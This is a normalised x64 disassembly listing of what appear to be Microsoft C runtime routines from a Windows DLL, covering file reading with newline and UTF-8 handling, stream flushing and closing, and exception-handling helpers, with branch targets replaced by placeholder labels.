mov [ rsp + 0x80 ] dil
mov [ rsp + 0x81 ] 0x0
mov ebp edi
lea rdx [ rsp + 0x50 ]
sar ebp 0x8
movzx ecx bpl
call sub_180019628
test eax eax
je r-xdata
mov rax [ rdx + 0x140 ]
movzx eax [ rax + rdi * 2 ]
and eax 0x1
lea r8 [ rsp + 0x50 ]
mov edx 0x1
mov ecx edi
call sub_18001cc74
mov rdx [ rsp + 0x50 ]
jmp r-xdata
cmp [ rsp + 0x68 ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ rsp + 0x90 ]
je r-xdata
mov [ rsp + 0x80 ] bpl
mov [ rsp + 0x81 ] dil
mov [ rsp + 0x82 ] 0x0
mov edx 0x2
jmp r-xdata
mov rax [ rdx + 0x148 ]
movzx eax [ rax + rdi ]
jmp r-xdata
test eax eax
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ rsp + 0x60 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x68 ] 0x0
je r-xdata
movzx ecx [ rsp + 0x91 ]
shl eax 0x8
or eax ecx
mov rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] 0x1
lea r9 [ rsp + 0x80 ]
mov eax [ rcx + 0x4 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x90 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edx
mov edx [ rcx + 0x14 ]
lea rcx [ rsp + 0x50 ]
call sub_18001a690
test eax eax
je r-xdata
mov rbp [ rsp + 0x88 ]
add rsp 0x70
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18001d340
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
call sub_18001d1d0
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
mov eax ecx
jmp r-xdata
add ecx 0x20
add rsp 0x28
retn
sub_18001d3a4
sub rsp 0x28
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
cmp rcx 0xfffffffffffffffe
je r-xdata
add rsp 0x28
retn
cmp rcx 0xfffffffffffffffe
je r-xdata
call [ CloseHandle@IAT ]
call [ CloseHandle@IAT ]
sub_18001d3e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
or edi 0xffffffff
mov rbx rcx
test rcx rcx
jne r-xdata
test [ rcx + 0x18 ] 0x83
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
or eax edi
jmp r-xdata
and [ rbx + 0x18 ] 0x0
mov eax edi
call sub_18001c2ac
mov rcx rbx
mov edi eax
call sub_18001e0c0
mov rcx rbx
call sub_18001923c
mov ecx eax
call sub_18001dfa8
test eax eax
jns r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
or edi 0xffffffff
jmp r-xdata
call sub_18000e06c
and [ rbx + 0x28 ] 0x0
sub_18001d46c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov rbx rcx
or edi 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test [ rcx + 0x18 ] 0x40
je r-xdata
call sub_180010834
mov [ rax ] 0x16
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
mov eax edi
jmp r-xdata
call sub_18001912c
nop
mov rcx rbx
call sub_18001d3e0
mov edi eax
mov rcx rbx
call sub_1800191bc
and [ rcx + 0x18 ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov eax edi
sub_18001d4e4
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x30
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180010834
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_180010834
mov [ rax ] 0x9
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or eax 0xffffffff
cmp edi [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov rbx rdi
mov rsi rdi
sar rsi 0x5
lea r12 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx edi
call sub_18001c018
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_180010834
mov [ rax ] 0x9
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or eax 0xffffffff
jmp r-xdata
call sub_180010834
mov [ rax ] 0x9
or ebx 0xffffffff
mov ecx edi
call sub_18001bf94
mov rcx rax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
xor ebx ebx
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_18001c0c0
mov eax ebx
jmp r-xdata
call sub_180010854
mov [ rax ] ebx
test ebx ebx
je r-xdata
sub_18001d5f8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] ecx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x58
mov r12d 0xfffffffe
movsxd rax ecx
mov ebx r8d
mov [ rsp + 0x34 ] r12d
mov [ rsp + 0x38 ] ebx
cmp eax r12d
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_180010854
xor edi edi
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x9
jmp r-xdata
call sub_180010854
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x9
cmp eax [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rsi rax
mov r14 rax
lea r9 [ __dos_header ]
sar r14 0x5
and esi 0x1f
mov rcx [ r9 + r14 * 8 + 0x35580 ]
imul rsi rsi 0x58
mov al [ rcx + rsi + 0x8 ]
test al 0x1
je r-xdata
cmp ebx 0x7fffffff
jbe r-xdata
mov ebp edi
cmp ebx edi
je r-xdata
call sub_180010854
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x16
jmp r-xdata
xor eax eax
jmp r-xdata
test al 0x2
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rdi
call sub_180010764
add rsp 0x58
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
cmp rdx rdi
je r-xdata
mov r15b [ rcx + rsi + 0x38 ]
mov r8d 0x4
add r15b r15b
sar r15b 0x1
movsx ecx r15b
sub ecx 0x1
je r-xdata
mov eax ebx
not eax
test al 0x1
je r-xdata
sub ecx 0x1
jne r-xdata
shr ebx 0x1
cmp ebx r8d
cmovb ebx r8d
mov ecx ebx
call sub_1800114a4
mov r13 rax
cmp rax rdi
jne r-xdata
mov r13 rdx
jmp r-xdata
mov eax ebx
not eax
test al 0x1
je r-xdata
mov ecx [ rsp + 0xa0 ]
xor edx edx
lea r8d [ rdx + 0x1 ]
call sub_1800184f0
lea r9 [ __dos_header ]
mov r11 rax
mov rax [ r9 + r14 * 8 + 0x35580 ]
mov [ rax + rsi + 0x40 ] r11
call sub_180010834
mov [ rax ] 0xc
call sub_180010854
mov [ rax ] 0x8
jmp r-xdata
mov rax [ r9 + r14 * 8 + 0x35580 ]
mov rdx r13
mov r8d 0xa
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
and ebx 0xfffffffe
mov rcx [ r9 + r14 * 8 + 0x35580 ]
lea r9 [ rsp + 0x30 ]
mov r8d ebx
mov rcx [ rcx + rsi ]
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
cmp eax edi
je r-xdata
mov cl [ rax + rsi + 0x9 ]
cmp cl r8b
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x5
jne r-xdata
movsxd rdx [ rsp + 0x30 ]
cmp edx edi
jl r-xdata
cmp ebx edi
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_180010834
mov [ rax ] 0x9
call sub_180010854
mov [ rax ] 0x5
jmp r-xdata
mov eax ebx
cmp rdx rax
ja r-xdata
mov [ r13 ] cl
mov rax [ r9 + r14 * 8 + 0x35580 ]
or r10d 0xffffffff
add ebx r10d
lea rdx [ r13 + 0x1 ]
lea ebp [ r8 - 0x9 ]
mov [ rax + rsi + 0x9 ] r8b
cmp r15b dil
je r-xdata
mov ecx eax
call sub_180010874
jmp r-xdata
mov r12d edi
jmp r-xdata
or r12d 0xffffffff
jmp r-xdata
lea r8 [ __dos_header ]
add ebp edx
mov rax [ r8 + r14 * 8 + 0x35580 ]
test [ rax + rsi + 0x8 ] 0x80
je r-xdata
mov rax [ r9 + r14 * 8 + 0x35580 ]
mov cl [ rax + rsi + 0x39 ]
cmp cl r8b
je r-xdata
mov r15 [ rsp + 0xa8 ]
cmp r15b 0x2
je r-xdata
cmp ebx edi
je r-xdata
cmp r12d 0xfffffffe
cmove r12d ebp
mov eax r12d
jmp r-xdata
mov rcx r13
call sub_18000e06c
cmp edx edi
mov edx 0xa
je r-xdata
cmp edx edi
je r-xdata
mov [ rdx ] cl
mov rax [ r9 + r14 * 8 + 0x35580 ]
add ebx r10d
inc rdx
lea ebp [ r8 - 0x8 ]
mov [ rax + rsi + 0x39 ] r8b
cmp r15b 0x1
jne r-xdata
and [ rax + rsi + 0x8 ] 0xfb
cmp [ r13 ] dx
jne r-xdata
and [ rax + rsi + 0x8 ] 0xfb
cmp [ r13 ] 0xa
jne r-xdata
mov rax [ r9 + r14 * 8 + 0x35580 ]
mov cl [ rax + rsi + 0x3a ]
cmp cl r8b
je r-xdata
mov ebp ebx
sub ebp r13d
mov ebp 0xd
or [ rax + rsi + 0x8 ] 0x4
jmp r-xdata
mov ebp ebx
sub ebp r13d
cmp r15b 0x1
jne r-xdata
mov ebp 0xd
or [ rax + rsi + 0x8 ] 0x4
jmp r-xdata
cmp ebx edi
je r-xdata
mov rax [ r8 + r14 * 8 + 0x35580 ]
test [ rax + rsi + 0x8 ] 0x40
jne r-xdata
cmp ax bp
je r-xdata
movsxd rax ebp
mov rbx r13
mov r12 r13
lea r15 [ rax + r13 ]
cmp r13 r15
jae r-xdata
mov r12d [ rsp + 0x34 ]
cmp ebp edi
je r-xdata
mov rax [ r8 + r14 * 8 + 0x35580 ]
test [ rax + rsi + 0x8 ] 0x40
jne r-xdata
cmp al bpl
je r-xdata
movsxd rax ebp
mov rbx r13
mov r12 r13
add rax r13
mov [ rsp + 0x40 ] rax
cmp r13 rax
jae r-xdata
mov [ rdx ] cl
mov rax [ r9 + r14 * 8 + 0x35580 ]
inc rdx
lea ebp [ r8 - 0x7 ]
add ebx r10d
mov [ rax + rsi + 0x3a ] r8b
movzx eax [ r12 ]
mov [ rbx ] ax
add rbx 0x2
or [ rax + rsi + 0x8 ] 0x2
jmp r-xdata
lea rax [ r15 - 0x2 ]
cmp r12 rax
jae r-xdata
mov [ rbx ] ax
add rbx 0x2
add r12 0x2
jmp r-xdata
mov r15d 0x1
sub rbx r15
test [ rbx ] 0x80
jne r-xdata
mov al [ r12 ]
mov [ rbx ] al
inc rbx
or [ rax + rsi + 0x8 ] 0x2
jmp r-xdata
mov rax [ rsp + 0x40 ]
dec rax
cmp r12 rax
jae r-xdata
mov [ rbx ] al
inc rbx
inc r12
jmp r-xdata
mov rcx [ r8 + r14 * 8 + 0x35580 ]
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0xb8 ]
mov rcx [ rcx + rsi ]
mov r8d 0x2
add r12 0x2
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
cmp eax edi
jne r-xdata
lea rax [ r12 + 0x2 ]
cmp [ rax ] dx
jne r-xdata
cmp r12 r15
jb r-xdata
mov edx r15d
jmp r-xdata
add rbx r15
jmp r-xdata
mov rcx [ r8 + r14 * 8 + 0x35580 ]
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0xb0 ]
mov rcx [ rcx + rsi ]
mov r8d 0x1
inc r12
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
cmp eax edi
jne r-xdata
lea rax [ r12 + 0x1 ]
cmp [ rax ] 0xa
jne r-xdata
cmp r12 [ rsp + 0x40 ]
jb r-xdata
cmp [ rsp + 0x30 ] edi
je r-xdata
call [ GetLastError@IAT ]
cmp eax edi
jne r-xdata
mov r12 rax
jmp r-xdata
add r12 0x4
jmp r-xdata
movzx eax [ r12 ]
cmp ax 0x1a
je r-xdata
jmp r-xdata
movzx eax [ rbx ]
cmp [ rax + r8 + 0x2e4a0 ] dil
je r-xdata
mov eax [ rsp + 0x38 ]
mov r15 [ rsp + 0xa8 ]
sub ebx r13d
shr eax 0x1
mov r9d ebx
mov r8 r13
mov [ rsp + 0x28 ] eax
xor edx edx
mov ecx 0xfde9
mov [ rsp + 0x20 ] r15
call [ MultiByteToWideChar@IAT ]
mov ebp eax
cmp eax edi
jne r-xdata
cmp [ rsp + 0x30 ] edi
je r-xdata
call [ GetLastError@IAT ]
cmp eax edi
jne r-xdata
mov r12 rax
jmp r-xdata
add r12 0x2
jmp r-xdata
mov al [ r12 ]
cmp al 0x1a
je r-xdata
jmp r-xdata
mov edx 0xa
lea r8 [ __dos_header ]
lea r8 [ __dos_header ]
mov rax [ r8 + r14 * 8 + 0x35580 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
mov [ rbx ] bp
mov [ rbx ] dx
jmp r-xdata
cmp edx 0x4
jg r-xdata
movzx ecx [ rbx ]
movsx eax [ rcx + r8 + 0x2e4a0 ]
cmp eax edi
jne r-xdata
mov r12d [ rsp + 0x34 ]
cmp eax ebx
lea rax [ __dos_header ]
mov rax [ rax + r14 * 8 + 0x35580 ]
setne dil
add ebp ebp
mov [ rax + rsi + 0x48 ] edi
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call sub_180010874
or r12d 0xffffffff
jmp r-xdata
lea r8 [ __dos_header ]
lea r8 [ __dos_header ]
mov rax [ r8 + r14 * 8 + 0x35580 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
mov [ rbx ] bpl
mov [ rbx ] 0xa
jmp r-xdata
cmp rbx r13
jne r-xdata
mov edx 0xa
cmp [ rsp + 0xb8 ] dx
je r-xdata
add rbx 0x2
cmp rbx r13
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_180010834
mov [ rax ] 0x2a
cmp r13 r15
je r-xdata
cmp rbx r13
jne r-xdata
cmp [ rsp + 0xb0 ] 0xa
je r-xdata
inc rbx
mov ecx [ rsp + 0xa0 ]
mov rdx 0xfffffffffffffffe
lea r8d [ rdx + 0x3 ]
call sub_1800184f0
mov edx 0xa
lea r8 [ __dos_header ]
cmp [ rsp + 0xb8 ] dx
je r-xdata
mov edx 0xa
cmp [ rsp + 0xb8 ] dx
jne r-xdata
mov [ rbx ] bp
mov al [ rsp + 0xb8 ]
mov rcx [ r8 + r14 * 8 + 0x35580 ]
mov [ rcx + rsi + 0x9 ] al
mov al [ rsp + 0xb9 ]
mov rcx [ r8 + r14 * 8 + 0x35580 ]
mov [ rcx + rsi + 0x39 ] al
mov rax [ r8 + r14 * 8 + 0x35580 ]
mov [ rax + rsi + 0x3a ] dl
jmp r-xdata
sub rbx r15
add edx r15d
mov rax [ r8 + r14 * 8 + 0x35580 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
movsxd rax edx
add rbx rax
jmp r-xdata
mov ecx [ rsp + 0xa0 ]
mov r8d 0x1
or rdx 0xffffffffffffffff
call sub_1800184f0
cmp [ rsp + 0xb0 ] 0xa
lea r8 [ __dos_header ]
je r-xdata
cmp [ rsp + 0xb0 ] 0xa
jne r-xdata
mov [ rbx ] bpl
mov rcx [ r8 + r14 * 8 + 0x35580 ]
mov al [ rsp + 0xb0 ]
mov [ rcx + rsi + 0x9 ] al
jmp r-xdata
jmp r-xdata
mov ecx [ rsp + 0xa0 ]
neg edx
mov r8d r15d
movsxd rdx edx
call sub_1800184f0
add rbx r15
cmp edx 0x2
mov [ rax + rsi + 0x9 ] cl
jl r-xdata
jmp r-xdata
cmp edx 0x3
jne r-xdata
mov al [ rbx ]
mov rcx [ r8 + r14 * 8 + 0x35580 ]
add rbx r15
mov [ rcx + rsi + 0x39 ] al
movsxd rax edx
sub rbx rax
jmp r-xdata
mov al [ rbx ]
mov rcx [ r8 + r14 * 8 + 0x35580 ]
add rbx r15
mov [ rcx + rsi + 0x3a ] al
sub_18001dd78
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov esi r8d
mov r13 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
xor ebx ebx
cmp edi ebx
jl r-xdata
call sub_180010854
xor ebx ebx
mov [ rax ] ebx
call sub_180010834
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_180010854
mov [ rax ] ebx
call sub_180010834
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or eax 0xffffffff
cmp edi [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov r12 rdi
mov r14 rdi
sar r14 0x5
lea r15 [ rw-data ]
and r12d 0x1f
imul r12 r12 0x58
mov rax [ r15 + r14 * 8 ]
movsx ecx [ rax + r12 + 0x8 ]
and ecx 0x1
jne r-xdata
mov eax ebx
cmp r8d 0x7fffffff
setbe al
cmp eax ebx
jne r-xdata
call sub_180010854
mov [ rax ] ebx
call sub_180010834
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or eax 0xffffffff
jmp r-xdata
mov ecx edi
call sub_18001c018
nop
mov rax [ r15 + r14 * 8 ]
test [ rax + r12 + 0x8 ] 0x1
je r-xdata
call sub_180010854
mov [ rax ] ebx
call sub_180010834
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or eax 0xffffffff
jmp r-xdata
call sub_180010834
mov [ rax ] 0x9
call sub_180010854
mov [ rax ] ebx
or ebx 0xffffffff
mov r8d esi
mov rdx r13
mov ecx edi
call sub_18001d5f8
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_18001c0c0
mov eax ebx
jmp r-xdata
sub_18001deec
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rdi ecx
mov ecx edi
call sub_18001bf94
cmp rax 0xffffffffffffffff
je r-xdata
xor ebx ebx
mov rax [ rw-data ]
mov ecx 0x2
cmp edi 0x1
jne r-xdata
xor eax eax
mov ecx ebx
call sub_180010874
or eax 0xffffffff
jmp r-xdata
cmp edi ecx
jne r-xdata
test [ rax + 0xb8 ] dil
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx edi
call sub_18001bf94
mov rcx rax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ rax + 0x60 ] 0x1
je r-xdata
call sub_18001bf94
mov ecx 0x1
mov rbx rax
call sub_18001bf94
cmp rax rbx
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_18001bee8
mov r11 rdi
mov rcx rdi
sar rcx 0x5
and r11d 0x1f
lea rdx [ rw-data ]
mov rcx [ rdx + rcx * 8 ]
imul r11 r11 0x58
mov [ rcx + r11 + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_18001dfa8
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
sub rsp 0x30
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
xor edi edi
cmp ebx edi
jl r-xdata
call sub_180010854
xor edi edi
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_180010854
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or eax 0xffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
mov rsi rbx
mov r12 rbx
sar r12 0x5
lea r13 [ rw-data ]
and esi 0x1f
imul rsi rsi 0x58
mov rax [ r13 + r12 * 8 ]
movsx ecx [ rax + rsi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_18001c018
nop
mov rax [ r13 + r12 * 8 ]
test [ rax + rsi + 0x8 ] 0x1
je r-xdata
call sub_180010854
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or eax 0xffffffff
jmp r-xdata
call sub_180010834
mov [ rax ] 0x9
or edi 0xffffffff
mov ecx ebx
call sub_18001deec
mov edi eax
jmp r-xdata
mov ecx ebx
call sub_18001c0c0
mov eax edi
jmp r-xdata
sub_18001e0c0
push rbx
sub rsp 0x20
test [ rcx + 0x18 ] 0x83
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
test [ rcx + 0x18 ] 0x8
je r-xdata
mov rcx [ rcx + 0x10 ]
call sub_18000e06c
and [ rbx + 0x18 ] 0xfffffbf7
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x8 ] eax
sub_18001e114
lea rax [ sub_18001e998 ]
lea rcx [ sub_18001f5b8 ]
mov [ rw-data ] rax
lea rax [ sub_18001e988 ]
mov [ rw-data ] rcx
mov [ rw-data ] rax
lea rax [ sub_18001e990 ]
mov [ rw-data ] rcx
mov [ rw-data ] rax
lea rax [ sub_18001e92c ]
mov [ rw-data ] rax
lea rax [ sub_18001f520 ]
mov [ rw-data ] rax
lea rax [ sub_18001e944 ]
mov [ rw-data ] rax
lea rax [ sub_18001e88c ]
mov [ rw-data ] rax
lea rax [ sub_18001e80c ]
mov [ rw-data ] rax
retn
sub_18001e1a4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
movsxd rdi [ r8 + 0xc ]
mov r15 rcx
mov rcx r8
mov rbp r9
mov r13 r8
mov r14 rdx
call sub_18001f668
mov r10 [ r15 ]
mov [ rbp ] r10
mov r12d eax
test edi edi
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
mov rax rbp
mov rbp [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rcx [ rdi + rdi * 4 ]
lea rsi [ rcx * 4 - 0x14 ]
sub rsi 0x14
add edi 0xffffffff
je r-xdata
cmp r12d [ rbx + 0x8 ]
jg r-xdata
jmp r-xdata
mov rcx [ r14 ]
lea rdx [ rsp + 0x50 ]
xor r8d r8d
call RtlLookupFunctionEntry
movsxd r8 [ rbx + 0x10 ]
mov r9d [ rbx + 0xc ]
add r8 [ rsp + 0x50 ]
mov r10d [ rax ]
xor ecx ecx
test r9d r9d
je r-xdata
movsxd rbx [ r13 + 0x10 ]
add rbx [ r14 + 0x8 ]
add rbx rsi
cmp r12d [ rbx + 0x4 ]
jle r-xdata
cmp ecx r9d
jb r-xdata
lea rdx [ r8 + 0xc ]
mov rax [ r15 ]
lea rcx [ rcx + rcx * 4 ]
movsxd rcx [ r8 + rcx * 4 + 0x10 ]
mov rcx [ rcx + rax ]
mov [ rbp ] rcx
inc ecx
add rdx 0x14
cmp ecx r9d
jb r-xdata
movsxd rax [ rdx ]
cmp rax r10
je r-xdata
sub_18001e2f8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea r9 [ rax + 0x18 ]
mov rbp r8
mov r12 rdx
call sub_18001e1a4
mov rdx r12
mov rcx rbp
mov r13 rax
call sub_18001f668
movsxd rdi [ rbp + 0xc ]
mov esi eax
test edi edi
je r-xdata
xor edx edx
lea rcx [ rdi + rdi * 4 ]
lea rbx [ rcx * 4 - 0x14 ]
mov r9d [ rdx + 0x4 ]
or r9d 0xffffffff
jmp r-xdata
sub rbx 0x14
add edi 0xffffffff
jne r-xdata
cmp esi [ rdx + 0x8 ]
jle r-xdata
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_18001f8c8
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
call sub_180010a54
movsxd rcx [ rbp + 0x10 ]
mov rdx [ rax + 0x128 ]
add rdx rcx
add rdx rbx
cmp esi [ rdx + 0x4 ]
jle r-xdata
test rdx rdx
jne r-xdata
sub_18001e3a4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rbx r9
mov rdi r8
mov rsi rcx
mov [ rsp + 0x50 ] rdx
call sub_180010a54
mov rdx [ rbx + 0x8 ]
mov [ rax + 0x128 ] rdx
call sub_180010a54
mov rdx [ rsi + 0x38 ]
mov [ rax + 0x130 ] rdx
call sub_180010a54
mov rdx [ rbx + 0x38 ]
mov r8d [ rdx ]
lea rdx [ rsp + 0x50 ]
mov r9 rbx
add r8 [ rax + 0x128 ]
xor eax eax
mov rcx rsi
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r8
mov r8 rdi
call sub_180020938
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_18001e42c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi r9
mov rbp r8
mov rbx rdx
mov rdi rcx
call sub_180010a54
mov [ rax + 0x138 ] rbx
mov rbx [ rdi ]
call sub_180010a54
mov rdx [ rbx + 0x38 ]
mov rcx [ rsp + 0x78 ]
mov r9 [ rsp + 0x70 ]
mov [ rsp + 0x38 ] 0x1
mov [ rax + 0x130 ] rdx
xor ebx ebx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rcx
mov rcx [ rdi ]
mov r8 rsi
mov rdx rbp
call sub_180020938
call sub_180010a54
mov rcx [ rsp + 0x80 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov [ rax + 0x138 ] rbx
lea eax [ rbx + 0x1 ]
mov rbx [ rsp + 0x50 ]
mov [ rcx ] 0x1
add rsp 0x40
pop rdi
retn
sub_18001e4d0
mov rax rsp
mov [ rax + 0x20 ] r9
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
sub rsp 0x60
mov rbx rcx
and [ rax - 0x28 ] 0x0
mov [ rax - 0x20 ] rcx
mov [ rax - 0x18 ] r8
call sub_180010a54
mov r8 [ rax + 0xe0 ]
lea rdx [ rsp + 0x48 ]
mov ecx [ rbx ]
call r8
mov [ rsp + 0x40 ] 0x0
jmp r-xdata
mov eax [ rsp + 0x40 ]
add rsp 0x60
pop rbx
retn
sub_18001e524
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
movsxd rbx [ rdx + 0xc ]
mov r12 [ rsp + 0x70 ]
mov rsi rdx
mov rcx rsi
mov rdx r12
mov r13d r9d
xor ebp ebp
call sub_18001f668
mov edi eax
test ebx ebx
jne r-xdata
mov r10 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
or r11d 0xffffffff
mov [ r10 ] r11d
mov edx ebx
mov [ r8 ] r11d
test ebx ebx
je r-xdata
call sub_180019758
test edx edx
je r-xdata
movsxd rcx [ rsi + 0x10 ]
lea rax [ rbx + rbx * 4 ]
lea rcx [ rcx + rax * 4 ]
mov rax [ r12 + 0x8 ]
lea r9 [ rcx + rax - 0xc ]
xor edx edx
test ebx ebx
je r-xdata
lea eax [ rdx - 0x1 ]
lea rdx [ rax + rax * 4 ]
movsxd rax [ rsi + 0x10 ]
lea rbp [ rax + rdx * 4 ]
add rbp [ r12 + 0x8 ]
sub r9 0x14
add edx r11d
jne r-xdata
cmp edi [ r9 ]
jle r-xdata
and [ r8 ] 0x0
and [ r10 ] 0x0
xor eax eax
xor r9d r9d
cmp edi [ r9 - 0x4 ]
jle r-xdata
cmp r13d [ rcx ]
jl r-xdata
mov eax [ rbp + 0x4 ]
cmp [ rcx ] eax
jle r-xdata
inc edx
add r9 0x14
